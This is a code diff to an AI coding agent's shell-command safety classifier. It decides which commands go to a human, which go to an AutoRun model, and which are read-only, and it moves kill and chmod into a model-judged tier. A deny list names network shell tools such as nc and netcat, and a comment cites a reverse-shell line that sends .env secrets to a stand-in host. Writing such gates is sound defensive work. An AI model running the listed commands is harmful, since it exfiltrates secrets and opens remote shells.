@@ -1,4 +1,4 @@
-import { isAbsolute } from 'path'
+import { isAbsolute, join } from 'path'
 import { splitCommand, hasCommandInjection } from './commands'
 
 // 仅凭首词即可判定安全的「真只读」单命令。
@@ -127,25 +127,34 @@ export function hasRedirection(command: string): boolean {
 // 危险首词：危险性在参数里、不该按首词前缀授权的命令。授权 rm:* / sudo:* 等会把
 // `rm -rf /`、任意 `sudo ...` 一并放行，故这些命令不提供前缀授权、也不被已存前缀覆盖。
 // 内部分两档（见 classifyDangerousCommand）：
-//  硬危险（sudo/dd/chmod/kill 等）→ 永远确定性转人工，不给模型裁决权；
-//  删除类（rm/rmdir/mv，另有 find -delete）→ 目标路径确定性落在项目内/临时目录时降为
-//  灰区，AutoRun 档位交快速模型结合上下文判断。
-// 本集合保持两档并集不变：前缀授权禁令、find -exec 目标与 $() 替换的递归分类仍按
-// 「一律危险」处理（-exec rm / $(rm ...) 不参与放宽）。
+//  硬危险（sudo/dd/chown 等）→ 永远确定性转人工，不给模型裁决权；
+//  灰区 → AutoRun 档位交快速模型结合上下文判断：
+//    - 删除类（rm/rmdir/mv，另有 find -delete）目标路径确定性落在项目内/临时目录
+//    - chmod 所有路径操作数确定性落在项目内/临时目录（改回来即可，可逆）
+//    - 进程类（kill/killall/pkill）：杀的是本机进程，dev server 重启即可，误放代价可逆；
+//      模型据轨迹判断是否 agent 自启的服务（kill $(lsof -t -i:3000)）还是宽泛 pkill node
+// DANGEROUS_PREFIX_COMMANDS 保持所有档并集不变：前缀授权禁令、find -exec 目标与 $() 替换的
+// 递归分类仍按「一律危险」处理（-exec rm / $(kill ...) 不参与放宽；模型放行一次 ≠ 允许保存 chmod:*）。
 // nc / ncat / netcat / telnet 是裸 socket：反弹 shell 与 `nc evil 4444 < .env` 的典型手段，合法用途
 // 只有 `nc -zv localhost 3000` 探端口这类，很少。归入硬危险即「始终人工」：每次确认、不给前缀授权、
 // AutoRun 也不交模型。curl/wget 等 HTTP 客户端另见 NETWORK_CONFIRM_COMMANDS。
+// eval 是任意执行原语（eval "$cmd"），与解释器 -c 同级；source / . 加载脚本虽也执行，但
+// `source venv/bin/activate` 是日常写法，留给模型判断。
 const HARD_DANGEROUS_COMMANDS = new Set([
   'dd', 'shred', 'truncate',
-  'chmod', 'chown', 'chgrp',
-  'kill', 'killall', 'pkill',
+  'chown', 'chgrp',
   'sudo', 'doas', 'su',
   'nc', 'ncat', 'netcat', 'telnet',
+  'eval',
 ])
+
+const PROCESS_COMMANDS = new Set(['kill', 'killall', 'pkill'])
 
 const DELETE_COMMANDS = new Set(['rm', 'rmdir', 'mv'])
 
-const DANGEROUS_PREFIX_COMMANDS = new Set([...HARD_DANGEROUS_COMMANDS, ...DELETE_COMMANDS])
+const DANGEROUS_PREFIX_COMMANDS = new Set([
+  ...HARD_DANGEROUS_COMMANDS, ...PROCESS_COMMANDS, ...DELETE_COMMANDS, 'chmod',
+])
 
 // ==================== find -exec 目标命令分类 ====================
 
@@ -223,11 +232,48 @@ const MAX_SUBSTITUTION_DEPTH = 3
 // 骨架占位符：替换 $(...) 后参与分词/分类，纯字母数字下划线，不会引入新的注入特征
 const SUBST_PLACEHOLDER = '__SUBST__'
 
-// $() 命令替换的分类结果，语义与 find -exec 目标分类同构：
+// $() 命令替换 / 注入形态命令的分类结果，语义与 find -exec 目标分类同构：
 //  readonly  → 所有内层命令与骨架均只读安全
-//  gray      → 内层或骨架存在非只读、非确定性危险的段（node/cd 等）→ 交 AutoRun 模型
-//  dangerous → 内层含危险首词/shell 解释器、反引号、解析失败/嵌套超限 → 确定性转人工
+//  gray      → 内层或骨架存在非只读、非确定性危险的段（node/cd/for 循环、带变量的 mv/rm、kill 等）
+//              → 交 AutoRun 模型
+//  dangerous → 硬危险首词/shell 解释器/eval、字面目标出项目的删除、反引号、解析失败/嵌套超限
+//              → 确定性转人工
 export type SubstitutionClass = 'readonly' | 'gray' | 'dangerous'
+
+// 注入形态下额外视为「任意执行原语」的首词（eval 已在 HARD_DANGEROUS_COMMANDS）：exec 替换当前 shell，
+// 与解释器同级；source / . 留给模型（见 HARD_DANGEROUS_COMMANDS 注释）
+const EXEC_PRIMITIVES = new Set(['exec'])
+
+// 段内是否有含变量/命令替换的操作数（首词之后任一 token 带展开）；分词失败按「有」处理（fail-closed）
+function hasExpandingOperand(seg: string): boolean {
+  const tokens = tokenizeSeg(seg)
+  if (!tokens) return true
+  return tokens.slice(1).some(t => t.hasExpansion)
+}
+
+/**
+ * 逐段分类（注入形态专用）：与顶层 classifyDangerousSeg 的差别在于「静态解析不了 ≠ 危险」——
+ * 删除/chmod 的目标含变量（for 循环里的 mv "$a" "$b"）时交模型而不是硬拦；目标是字面路径时
+ * 仍按顶层规则裁决（字面出项目 → dangerous）。硬危险首词、解释器、eval 维持 dangerous。
+ */
+function classifyInjectedSeg(seg: string, checker: DeleteTargetChecker | undefined, cwd: SegCwd): SubstitutionClass {
+  const s = seg.trim()
+  const first = s.split(/\s+/)[0] ?? ''
+  if (SHELL_INTERPRETERS.has(first) || EXEC_PRIMITIVES.has(first)) return 'dangerous'
+  if (HARD_DANGEROUS_COMMANDS.has(first) || first.startsWith('mkfs')) return 'dangerous'
+  if (PROCESS_COMMANDS.has(first)) return 'gray'
+  const isFindDelete = first === 'find' && FIND_DELETE_FLAG.test(s)
+  if (first === 'find' && !isFindDelete) {
+    if (FIND_HARD_ACTION_FLAGS.test(s) || classifyFindExecTargets(s) === 'dangerous') return 'dangerous'
+    return isReadonlySafeSubcommand(s) ? 'readonly' : 'gray'
+  }
+  if (DELETE_COMMANDS.has(first) || first === 'chmod' || isFindDelete) {
+    if (!checker || hasExpandingOperand(s)) return 'gray'
+    const c = classifyDangerousSeg(s, checker, cwd)
+    return c === 'hard' ? 'dangerous' : 'gray'
+  }
+  return isReadonlySafeSubcommand(s) ? 'readonly' : 'gray'
+}
 
 /**
  * 从 $( 之后的位置找配对的右括号，返回其下标；找不到返回 -1。
@@ -308,36 +354,49 @@ function extractCommandSubstitutions(command: string): { skeleton: string; inner
 }
 
 /**
- * 对「注入特征仅可能来自 $() 命令替换」的整条命令做递归分类。
+ * 对「含注入特征」的整条命令做递归分类：$() 命令替换、`;` 分隔、for/while 循环、变量操作数
+ * 这些静态解析器读不懂但模型读得懂的形态，都走这里细分而不是一律硬拦。
  * 内层命令先递归分类（内层自身可含 && / | / 嵌套 $() 等）；随后骨架经 splitCommand
- * 分段，逐段按顶层三层规则判定：危险首词/解释器/嵌套危险 find → dangerous；
- * 只读安全 → readonly；其余 → gray。骨架残留任何注入特征（换行等）→ dangerous。
+ * 分段，逐段按 classifyInjectedSeg 判定，取最严；骨架内残留换行 → dangerous（多行请调用方
+ * 逐行分类）。字面 cd 同样跟踪 cwd。
  *
  * 供权限闸门使用：dangerous → 确定性转人工（不给模型机会）；readonly/gray → 交
  * AutoRun 模型判断。刻意不提供确定性放行——放行与否只由模型或人工裁决，解析器
  * 误差最多把命令送去模型，绝不静默放过。
+ *
+ * @param checker 删除/chmod 字面目标的范围回调（同 classifyDangerousCommand）；不传则这类段一律 gray
  */
-export function classifyCommandSubstitutions(command: string, depth = 0): SubstitutionClass {
+export function classifyCommandSubstitutions(command: string, checker?: DeleteTargetChecker, depth = 0): SubstitutionClass {
   if (depth > MAX_SUBSTITUTION_DEPTH) return 'dangerous'
   const parsed = extractCommandSubstitutions(command)
   if (!parsed) return 'dangerous'
   let worst: SubstitutionClass = 'readonly'
   for (const inner of parsed.inners) {
-    const c = classifyCommandSubstitutions(inner, depth + 1)
+    const c = classifyCommandSubstitutions(inner, checker, depth + 1)
     if (c === 'dangerous') return 'dangerous'
     if (c === 'gray') worst = 'gray'
   }
   let segs: string[]
   try { segs = splitCommand(parsed.skeleton) } catch { return 'dangerous' }
   if (segs.length === 0) return 'dangerous'
-  for (const seg of segs) {
+  const cwds = trackSegCwds(parsed.skeleton, segs)
+  for (let i = 0; i < segs.length; i++) {
+    const seg = segs[i]!
     if (hasCommandInjection(seg)) return 'dangerous'
-    const first = seg.trim().split(/\s+/)[0] ?? ''
-    if (SHELL_INTERPRETERS.has(first)) return 'dangerous'
-    if (isDangerousSubcommand(seg)) return 'dangerous'
-    if (!isReadonlySafeSubcommand(seg)) worst = 'gray'
+    const c = classifyInjectedSeg(seg, checker, cwds[i] ?? null)
+    if (c === 'dangerous') return 'dangerous'
+    if (c === 'gray') worst = 'gray'
   }
   return worst
+}
+
+/**
+ * 多行命令（heredoc 剥离正文后的骨架、换行拼接的多条命令）的分类。
+ * 结束符之后再接命令是 agent 的常见写法（跑完脚本再 cat 结果），不是藏命令——模型看得到全文。
+ * shell 里换行与 `;` 等价，直接替换后整体分类：cd 跟踪跨行仍成立，分段规则与单行一致。
+ */
+export function classifyMultilineCommand(skeleton: string, checker?: DeleteTargetChecker): SubstitutionClass {
+  return classifyCommandSubstitutions(skeleton.replace(/\n+/g, ' ; '), checker)
 }
 
 function isDangerousSubcommand(seg: string): boolean {
@@ -427,8 +486,8 @@ export function hasNetworkCommand(command: string): boolean {
 
 const READ_METHODS = new Set(['GET', 'HEAD'])
 
-// 环回主机：用户自己机器上的服务。与 fetchSafety.isBlockedFetchHost 刻意区分——那里是 fetch_url 的
-// SSRF 边界（环回/内网/元数据一律拦），这里只认环回，内网与云元数据地址仍交模型/人工。
+// 环回主机：用户自己机器上的服务。与 fetchSafety.classifyFetchHost 的 loopback 档语义一致，
+// 这里只认环回，内网与云元数据地址仍交模型/人工。
 function isLoopbackHost(hostname: string): boolean {
   const h = hostname.toLowerCase().replace(/^\[|\]$/g, '').replace(/\.$/, '')
   if (h === 'localhost' || h.endsWith('.localhost')) return true
@@ -664,20 +723,103 @@ const FIND_DELETE_FLAG = /(^|\s)-delete\b/
 
 /**
  * 危险命令分级结果：
- *  none      → 不含危险子命令（与 hasDangerousCommand === false 等价）
- *  deletable → 仅含删除类子命令（rm/rmdir/mv/find -delete）且所有删除目标确定性落在
- *              允许范围内（由调用方回调裁决，通常为项目内或系统临时目录）→ AutoRun 可交模型判断
- *  hard      → 硬危险（sudo/dd/chmod 等）、删除目标无法静态确认落在允许范围、或解析失败
- *              （fail-closed）→ 确定性转人工，不给模型机会
+ *  none → 不含危险子命令（与 hasDangerousCommand === false 等价）
+ *  gray → 只含可逆的灰区子命令：删除类（rm/rmdir/mv/find -delete）与 chmod 的所有目标确定性
+ *         落在允许范围内（由调用方回调裁决，通常为项目内或系统临时目录）、进程类（kill/killall/pkill）
+ *         → AutoRun 可交模型判断
+ *  hard → 硬危险（sudo/dd/chown 等）、目标无法静态确认落在允许范围、或解析失败（fail-closed）
+ *         → 确定性转人工，不给模型机会
  */
-export type DangerClass = 'none' | 'deletable' | 'hard'
+export type DangerClass = 'none' | 'gray' | 'hard'
 
-// 删除目标的两种形态，供路径策略回调区分：
-//  literal → 目标就是该路径本身（rm foo.txt）：项目根自身/.git 应被策略拒绝
+// 目标路径的两种形态，供路径策略回调区分：
+//  literal → 目标就是该路径本身（rm foo.txt / chmod +x foo.sh）：项目根自身/.git 应被策略拒绝
 //  globdir → 目标是「该目录下的匹配项」（rm dist/*.js 的 dist/、find . -delete 的 .）：
 //            目录允许是项目根（删的是根下内容而非根本身），.git 仍应拒绝
 export type DeleteTargetKind = 'literal' | 'globdir'
 export type DeleteTargetChecker = (path: string, kind: DeleteTargetKind) => boolean
+
+// ==================== cd 跟踪 ====================
+
+// 每个子命令生效时的 cwd：'' 表示仍是命令启动时的 cwd（相对路径原样交策略回调，按项目根解析）；
+// 绝对路径表示经字面 cd 后的目录（相对目标先拼上它）；null 表示无法静态跟踪（相对目标一律拒绝）。
+type SegCwd = string | null
+
+// 引号感知地把整条命令按列表/管道分隔符切段，记录每段前面的分隔符。
+// 只为 cd 跟踪服务：splitCommand 会丢掉分隔符信息，而 cwd 能否沿用取决于分隔符语义
+// （&& 安全：cd 失败后续不执行；|| 与管道不安全：cd 可能被跳过或跑在子 shell 里）。
+// 引号外出现 ( ) { } → 子 shell/分组，cd 作用域无法静态跟踪 → null。
+function splitWithOperators(command: string): { op: string; seg: string }[] | null {
+  const out: { op: string; seg: string }[] = []
+  let cur = ''
+  let op = ''
+  let inSingle = false
+  let inDouble = false
+  const flush = (nextOp: string) => {
+    out.push({ op, seg: cur.trim() })
+    cur = ''
+    op = nextOp
+  }
+  for (let i = 0; i < command.length; i++) {
+    const c = command[i]!
+    if (inSingle) { if (c === "'") inSingle = false; cur += c; continue }
+    if (c === '\\') { cur += c + (command[i + 1] ?? ''); i++; continue }
+    if (inDouble) { if (c === '"') inDouble = false; cur += c; continue }
+    if (c === "'") { inSingle = true; cur += c; continue }
+    if (c === '"') { inDouble = true; cur += c; continue }
+    if (c === '(' || c === ')' || c === '{' || c === '}') return null
+    const two = command.slice(i, i + 2)
+    if (two === '&&' || two === '||') { flush(two); i++; continue }
+    if (c === '|' || c === ';' || c === '\n') { flush(c); continue }
+    cur += c
+  }
+  if (inSingle || inDouble) return null
+  flush('')
+  return out.filter(e => e.seg !== '')
+}
+
+/**
+ * 静态跟踪 cd/pushd/popd 对后续子命令 cwd 的影响，返回与 segs 一一对应的 cwd 数组。
+ * 可跟踪的只有「字面路径的 cd」（无变量/通配/~、非 `cd -`、非裸 cd）且其前后分隔符都是 &&
+ * （首段或经 ; / 换行接续也可）；pushd/popd、`||`、管道内 cd、子 shell、分段数与 splitCommand
+ * 对不上 → 从该处起（或整体）不可跟踪。fail-closed：任何不确定都退化为 null。
+ */
+function trackSegCwds(command: string, segs: string[]): SegCwd[] {
+  const parts = splitWithOperators(command)
+  if (!parts || parts.length !== segs.length) return segs.map(() => null)
+  const cwds: SegCwd[] = []
+  let cwd: SegCwd = ''
+  for (let i = 0; i < parts.length; i++) {
+    const { op, seg } = parts[i]!
+    const nextOp = parts[i + 1]?.op ?? ''
+    const first = seg.split(/\s+/)[0] ?? ''
+    if (first === 'pushd' || first === 'popd') cwd = null
+    if (first === 'cd') {
+      const tokens = tokenizeSeg(seg)
+      const target = tokens?.[1]
+      const pipelined = op === '|' || nextOp === '|'
+      if (
+        cwd === null || pipelined || !tokens || tokens.length !== 2 || !target ||
+        target.hasExpansion || target.globIndex >= 0 || target.text === '-' || target.text.startsWith('~')
+      ) {
+        cwd = null
+      } else {
+        cwd = isAbsolute(target.text) ? target.text : (cwd ? join(cwd, target.text) : target.text)
+      }
+    }
+    // `||` 之后 cd 是否执行过取决于前段成败，无法静态判断
+    if (op === '||') cwd = null
+    cwds.push(cwd)
+  }
+  return cwds
+}
+
+// 相对目标按跟踪到的 cwd 解析：cwd 为 '' 时原样返回（调用方按项目根解析），null 时不可解析
+function resolveAgainstCwd(text: string, cwd: SegCwd): string | null {
+  if (isAbsolute(text)) return text
+  if (cwd === null) return null
+  return cwd ? join(cwd, text) : text
+}
 
 // 段内 token 及其安全相关特征：text 为去引号后的字面值；globIndex 为首个引号外
 // 通配符（* ? [）在 text 中的下标（无则 -1）；hasExpansion 表示含未被单引号保护的
@@ -741,23 +883,23 @@ function tokenizeSeg(seg: string): SegToken[] | null {
 }
 
 /**
- * 单个删除目标 token 是否可静态确认落在允许范围。
+ * 单个目标 token 是否可静态确认落在允许范围。
  * 含变量/命令替换、~ 展开 → 不可静态解析 → 拒绝；
- * cwd 不可靠（命令里出现 cd/pushd）时相对路径拒绝；
+ * 相对路径按该段跟踪到的 cwd 解析（不可跟踪时拒绝）；
  * 通配符目标退化为「其字面前缀的目录部分」按 globdir 交策略回调。
  */
-function checkDeleteTarget(t: SegToken, isDeletableTarget: DeleteTargetChecker, cwdUnreliable: boolean): boolean {
+function checkDeleteTarget(t: SegToken, isDeletableTarget: DeleteTargetChecker, cwd: SegCwd): boolean {
   if (t.hasExpansion) return false
   const text = t.text
   if (!text || text.startsWith('~')) return false
-  if (cwdUnreliable && !isAbsolute(text)) return false
   if (t.globIndex >= 0) {
     const prefix = text.slice(0, t.globIndex)
     const slash = prefix.lastIndexOf('/')
-    const dir = slash >= 0 ? prefix.slice(0, slash + 1) : ''
-    return isDeletableTarget(dir || '.', 'globdir')
+    const dir = resolveAgainstCwd(slash >= 0 ? prefix.slice(0, slash + 1) : '.', cwd)
+    return dir !== null && isDeletableTarget(dir, 'globdir')
   }
-  return isDeletableTarget(text, 'literal')
+  const resolved = resolveAgainstCwd(text, cwd)
+  return resolved !== null && isDeletableTarget(resolved, 'literal')
 }
 
 /**
@@ -765,7 +907,7 @@ function checkDeleteTarget(t: SegToken, isDeletableTarget: DeleteTargetChecker, 
  * mv --target-directory=DIR 的 DIR 也计入目标（-t DIR 的 DIR 不带 - 前缀，天然计入）。
  * 无任何操作数（如裸 `rm -rf`）→ hard。
  */
-function checkDeleteOperands(seg: string, isDeletableTarget: DeleteTargetChecker, cwdUnreliable: boolean): DangerClass {
+function checkDeleteOperands(seg: string, isDeletableTarget: DeleteTargetChecker, cwd: SegCwd): DangerClass {
   const tokens = tokenizeSeg(seg)
   if (!tokens || tokens.length === 0) return 'hard'
   const operands: SegToken[] = []
@@ -785,9 +927,40 @@ function checkDeleteOperands(seg: string, isDeletableTarget: DeleteTargetChecker
   }
   if (operands.length === 0) return 'hard'
   for (const t of operands) {
-    if (!checkDeleteTarget(t, isDeletableTarget, cwdUnreliable)) return 'hard'
+    if (!checkDeleteTarget(t, isDeletableTarget, cwd)) return 'hard'
   }
-  return 'deletable'
+  return 'gray'
+}
+
+/**
+ * chmod 段的路径操作数校验：跳过 flag，第一个非 flag 操作数是 mode（+x / 755 / u=rw），
+ * 其余都是路径，须全部确定性落在允许范围（同删除类）。`--reference=FILE` 只读取 FILE 的
+ * mode，按 flag 跳过；`--` 之后第一个 token 仍是 mode（chmod -- -x file 的写法）。
+ * 没有路径操作数 → hard（fail-closed）。
+ */
+function checkChmodOperands(seg: string, isDeletableTarget: DeleteTargetChecker, cwd: SegCwd): DangerClass {
+  const tokens = tokenizeSeg(seg)
+  if (!tokens || tokens.length === 0) return 'hard'
+  const paths: SegToken[] = []
+  let afterDoubleDash = false
+  let modeSeen = false
+  for (let i = 1; i < tokens.length; i++) {
+    const t = tokens[i]!
+    if (!afterDoubleDash) {
+      if (t.text === '--') { afterDoubleDash = true; continue }
+      if (t.text.startsWith('--reference=')) { modeSeen = true; continue }
+      // -R/-v 等 flag；-x/-w 这类以 - 开头的 mode 与 flag 无法区分，一律按 flag 跳过，
+      // 后果只是第一个路径被当成 mode 吞掉：单路径时 paths 为空 → hard，多路径时其余仍逐个校验，fail-closed
+      if (t.text.startsWith('-') && t.text !== '-') continue
+    }
+    if (!modeSeen) { modeSeen = true; continue }
+    paths.push(t)
+  }
+  if (paths.length === 0) return 'hard'
+  for (const t of paths) {
+    if (!checkDeleteTarget(t, isDeletableTarget, cwd)) return 'hard'
+  }
+  return 'gray'
 }
 
 /**
@@ -795,7 +968,7 @@ function checkDeleteOperands(seg: string, isDeletableTarget: DeleteTargetChecker
  * 收集表达式（- 开头 / ( / !）之前的位置参数为起始路径；无起始路径按 find 默认的 `.`。
  * 删除发生在起始路径目录树内，按 globdir 语义交策略回调。
  */
-function checkFindDeleteTargets(seg: string, isDeletableTarget: DeleteTargetChecker, cwdUnreliable: boolean): DangerClass {
+function checkFindDeleteTargets(seg: string, isDeletableTarget: DeleteTargetChecker, cwd: SegCwd): DangerClass {
   const tokens = tokenizeSeg(seg)
   if (!tokens || tokens.length === 0) return 'hard'
   const paths: SegToken[] = []
@@ -813,43 +986,53 @@ function checkFindDeleteTargets(seg: string, isDeletableTarget: DeleteTargetChec
   for (const t of paths) {
     // 起始路径含通配符（find dist/* -delete）：shell 已展开，逐个匹配项都是目录起点，
     // checkDeleteTarget 会按 globdir 退化到字面前缀目录，语义一致
-    const ok = t.globIndex >= 0
-      ? checkDeleteTarget(t, isDeletableTarget, cwdUnreliable)
-      : (!t.hasExpansion && !!t.text && !t.text.startsWith('~') &&
-         !(cwdUnreliable && !isAbsolute(t.text)) && isDeletableTarget(t.text, 'globdir'))
+    let ok: boolean
+    if (t.globIndex >= 0) {
+      ok = checkDeleteTarget(t, isDeletableTarget, cwd)
+    } else {
+      const resolved = !t.hasExpansion && !!t.text && !t.text.startsWith('~') ? resolveAgainstCwd(t.text, cwd) : null
+      ok = resolved !== null && isDeletableTarget(resolved, 'globdir')
+    }
     if (!ok) return 'hard'
   }
-  return 'deletable'
+  return 'gray'
 }
 
-function classifyDangerousSeg(seg: string, isDeletableTarget: DeleteTargetChecker, cwdUnreliable: boolean): DangerClass {
+function classifyDangerousSeg(seg: string, isDeletableTarget: DeleteTargetChecker, cwd: SegCwd): DangerClass {
   const s = seg.trim()
   const first = s.split(/\s+/)[0] ?? ''
   if (HARD_DANGEROUS_COMMANDS.has(first) || first.startsWith('mkfs')) return 'hard'
+  // 进程类不看参数：杀本机进程可逆，是否 agent 自启的服务由模型据轨迹判断
+  if (PROCESS_COMMANDS.has(first)) return 'gray'
   if (first === 'find') {
     if (FIND_HARD_ACTION_FLAGS.test(s) || classifyFindExecTargets(s) === 'dangerous') return 'hard'
     if (!FIND_DELETE_FLAG.test(s)) return 'none'
     if (REDIRECTION_RE.test(s)) return 'hard'
-    return checkFindDeleteTargets(s, isDeletableTarget, cwdUnreliable)
+    return checkFindDeleteTargets(s, isDeletableTarget, cwd)
   }
+  // 删除/chmod 命令夹带重定向属反常组合，不细分，fail-closed
   if (DELETE_COMMANDS.has(first)) {
-    // 删除命令夹带重定向属反常组合，不细分，fail-closed
     if (REDIRECTION_RE.test(s)) return 'hard'
-    return checkDeleteOperands(s, isDeletableTarget, cwdUnreliable)
+    return checkDeleteOperands(s, isDeletableTarget, cwd)
+  }
+  if (first === 'chmod') {
+    if (REDIRECTION_RE.test(s)) return 'hard'
+    return checkChmodOperands(s, isDeletableTarget, cwd)
   }
   return 'none'
 }
 
 /**
- * 整条命令的危险分级：逐子命令取最严（任一 hard → hard；否则任一 deletable → deletable）。
+ * 整条命令的危险分级：逐子命令取最严（任一 hard → hard；否则任一 gray → gray）。
  * 与 hasDangerousCommand 严格对齐：本函数返回 none 当且仅当 hasDangerousCommand 为 false，
  * 即分级只在「现状确定性转人工」的集合内部细分，绝不扩大放行面。
  *
- * 命令里出现 cd/pushd/popd 时后续子命令的 cwd 无法静态跟踪，相对路径目标一律拒绝
- * （绝对路径不受影响）。解析失败 fail-closed 判 hard。
+ * 命令里的字面 cd（`cd /tmp && rm -rf x`、`cd packages/app && rm -rf dist`）按 && 语义静态跟踪，
+ * 后续相对目标先拼上跟踪到的目录再交策略回调；无法跟踪（变量/~/pushd/`||`/管道/子 shell）
+ * 时相对路径目标一律拒绝（绝对路径不受影响）。解析失败 fail-closed 判 hard。
  *
- * @param isDeletableTarget 路径策略回调：判定单个删除目标（已解析为字面路径）是否落在
- *        允许删除的范围（由调用方定义，通常为项目内或系统临时目录，排除项目根自身与 .git）
+ * @param isDeletableTarget 路径策略回调：判定单个目标（已解析为字面路径）是否落在
+ *        允许范围（由调用方定义，通常为项目内或系统临时目录，排除项目根自身与 .git）
  */
 export function classifyDangerousCommand(command: string, isDeletableTarget: DeleteTargetChecker): DangerClass {
   let segs: string[]
@@ -858,15 +1041,12 @@ export function classifyDangerousCommand(command: string, isDeletableTarget: Del
   } catch {
     return 'hard'
   }
-  const cwdUnreliable = segs.some(seg => {
-    const first = seg.trim().split(/\s+/)[0]
-    return first === 'cd' || first === 'pushd' || first === 'popd'
-  })
+  const cwds = trackSegCwds(command, segs)
   let cls: DangerClass = 'none'
-  for (const seg of segs) {
-    const c = classifyDangerousSeg(seg, isDeletableTarget, cwdUnreliable)
+  for (let i = 0; i < segs.length; i++) {
+    const c = classifyDangerousSeg(segs[i]!, isDeletableTarget, cwds[i] ?? null)
     if (c === 'hard') return 'hard'
-    if (c === 'deletable') cls = 'deletable'
+    if (c === 'gray') cls = 'gray'
   }
   return cls
 }
